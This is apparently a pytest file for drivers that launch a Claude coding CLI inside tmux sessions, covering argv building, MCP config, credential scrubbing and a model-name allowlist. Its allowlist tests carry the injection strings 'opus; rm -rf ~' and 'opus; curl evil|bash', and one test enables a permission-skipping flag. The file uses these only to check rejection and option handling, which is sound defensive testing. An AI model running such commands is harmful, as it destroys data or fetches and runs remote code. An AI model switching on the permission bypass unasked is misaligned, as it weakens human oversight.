from agent.coding_host_drivers import (
    DesktopDriver, LocalDriver, is_valid_model, SCRUB_KEYS)


def test_claude_argv_adds_mcp_config_when_given():
    d = LocalDriver()
    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md", model=None,
                         initial_prompt=None, mcp_config="/tmp/cs_1/mcp.json")
    assert "--mcp-config" in argv
    assert argv[argv.index("--mcp-config") + 1] == "/tmp/cs_1/mcp.json"
    # --strict-mcp-config rides along with a per-session config so the plugin's
    # own jc-client mcp-serve (absent on the server) is IGNORED, not ENOENT'd.
    assert "--strict-mcp-config" in argv
    # omitted when not given
    argv2 = d.claude_argv(plugin_dir="/p", context_file="/c.md", model=None,
                          initial_prompt=None)
    assert "--mcp-config" not in argv2
    # ...and so is strict: a desktop-host session (mcp_config=None) keeps the
    # plugin's jc-client mcp-serve, which strict would have suppressed.
    assert "--strict-mcp-config" not in argv2


def test_local_driver_mcp_servers_runs_server_side_module():
    import sys
    d = LocalDriver()
    cfg = d.mcp_servers(cwd="/work", repo_root="/repo")
    srv = cfg["mcpServers"]["jarviscopilot-code-assist"]
    # server host runs the LOCAL-store MCP, not the desktop's jc-client binary.
    # The command is THIS interpreter (the venv python that actually has `mcp`),
    # NOT bare "python3" (the system python lacks mcp.server.fastmcp).
    assert srv["command"] == (sys.executable or "python3")
    assert srv["args"] == ["-m", "agent.coding_mcp_server"]
    assert srv["env"]["PYTHONPATH"] == "/repo"


def test_desktop_driver_mcp_servers_is_none():
    # a server-written --mcp-config path is unreadable on the desktop, so the
    # desktop host gets no override (it supplies its own jc-client mcp-serve).
    d = DesktopDriver(bridge_run=lambda argv: None)
    assert d.mcp_servers(cwd="/work", repo_root="/repo") is None


def test_is_valid_model_allowlist():
    assert is_valid_model("opus")
    assert is_valid_model("claude-opus-4-8")
    assert not is_valid_model("opus; rm -rf ~")
    assert not is_valid_model("gpt-5")
    assert not is_valid_model("")
    assert not is_valid_model(None)


def test_claude_argv_scrubs_creds_and_has_plugin_and_context():
    d = LocalDriver()
    argv = d.claude_argv(
        plugin_dir="/repo/plugins/jarviscopilot-code-assist",
        context_file="/home/x/.jarviscopilot/coding_sessions/cs_1/JARVIS-CONTEXT.md",
        model="opus", initial_prompt=None)
    # env -u <secret> ... prefix strips creds at exec
    assert argv[0] == "env"
    for k in SCRUB_KEYS:
        assert "-u" in argv and k in argv
    assert "claude" in argv
    assert "--plugin-dir" in argv
    assert "/repo/plugins/jarviscopilot-code-assist" in argv
    assert "--append-system-prompt-file" in argv
    assert "--model" in argv and "opus" in argv
    # NOT the crippled inference-shim flags
    assert "--tools" not in argv
    assert "--no-session-persistence" not in argv


def test_claude_argv_drops_invalid_model():
    d = LocalDriver()
    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md",
                         model="opus; curl evil|bash", initial_prompt=None)
    # an injection-shaped model is never forwarded
    assert "--model" not in argv
    assert "opus; curl evil|bash" not in argv


def test_claude_argv_skip_permissions():
    d = LocalDriver()
    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md", model=None,
                         initial_prompt=None, skip_permissions=True)
    assert "IS_SANDBOX=1" in argv          # so claude-as-root allows the flag
    assert "--dangerously-skip-permissions" in argv


def test_claude_argv_resume_continues_and_drops_prompt():
    d = LocalDriver()
    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md", model=None,
                         initial_prompt="should be dropped", resume=True)
    assert "--continue" in argv
    assert "should be dropped" not in argv


def test_claude_argv_passes_initial_prompt_as_argv_element():
    d = LocalDriver()
    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md",
                         model=None, initial_prompt="fix the failing tests")
    # passed as a single argv element — no shell, no quoting needed
    assert "fix the failing tests" in argv


def test_tmux_new_argv_runs_launch_argv_directly():
    d = LocalDriver()
    argv = d.tmux_new_argv(tmux_name="jc-abc", cwd="/repo",
                           launch_argv=["env", "claude"])
    assert argv[:3] == ["tmux", "new-session", "-d"]
    assert "-s" in argv and "jc-abc" in argv
    assert "-c" in argv and "/repo" in argv
    # the launch argv is appended so claude is the pane's command (no shell race)
    assert argv[-2:] == ["env", "claude"]


def test_send_keys_uses_dash_dash_terminator():
    d = LocalDriver()
    seq = d.send_message_argvs(tmux_name="jc-abc", text="-v dash-leading message")
    # '--' before the literal text so a leading dash isn't parsed as options
    assert seq[0] == ["tmux", "send-keys", "-t", "jc-abc", "-l", "--", "-v dash-leading message"]
    assert seq[-1] == ["tmux", "send-keys", "-t", "jc-abc", "Enter"]


def test_subprocess_env_scrubs_api_key(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-should-be-removed")
    d = LocalDriver()
    env = d.subprocess_env()
    assert "ANTHROPIC_API_KEY" not in env
    assert env.get("HOME")


def test_desktop_driver_reuses_construction_and_routes_through_bridge():
    from agent.coding_host_drivers import DesktopDriver

    sent = []
    d = DesktopDriver(bridge_run=lambda argv: sent.append(argv) or
                      __import__("types").SimpleNamespace(returncode=0, stderr=""))
    assert d.name == "desktop"
    # command construction is inherited from LocalDriver
    argv = d.tmux_new_argv(tmux_name="jc-x", cwd="/r", launch_argv=["env", "claude"])
    assert argv[:3] == ["tmux", "new-session", "-d"]
    res = d._run(argv)
    assert sent == [argv]
    assert res.returncode == 0


def test_desktop_driver_without_bridge_raises():
    from agent.coding_host_drivers import DesktopDriver

    d = DesktopDriver()
    try:
        d._run(["tmux", "ls"])
        assert False, "expected RuntimeError"
    except RuntimeError as e:
        assert "transport not configured" in str(e)


def test_desktop_driver_preflight_without_client():
    from agent.coding_host_drivers import DesktopDriver

    # no bridge + no preflight_fn -> clear "pair a desktop client" message
    assert "desktop client" in DesktopDriver().preflight()


def test_desktop_driver_preflight_delegates():
    from agent.coding_host_drivers import DesktopDriver

    d = DesktopDriver(preflight_fn=lambda: None)
    assert d.preflight() is None
    d2 = DesktopDriver(preflight_fn=lambda: "no tmux on your Mac")
    assert d2.preflight() == "no tmux on your Mac"


def test_capture_pane_argv_shape():
    d = LocalDriver()
    assert d.capture_pane_argv(tmux_name="jc-abc", lines=80) == [
        "tmux", "capture-pane", "-p", "-t", "jc-abc", "-S", "-80"]


def test_capture_pane_returns_stdout():
    import types
    d = LocalDriver()
    d._run = lambda a: types.SimpleNamespace(
        stdout="✻ Running… (esc to interrupt)", stderr="", returncode=0)
    assert "esc to interrupt" in d.capture_pane(tmux_name="jc-abc")


def test_capture_pane_swallows_errors():
    d = LocalDriver()
    def _boom(a):
        raise RuntimeError("no tmux")
    d._run = _boom
    assert d.capture_pane(tmux_name="jc-x") == ""
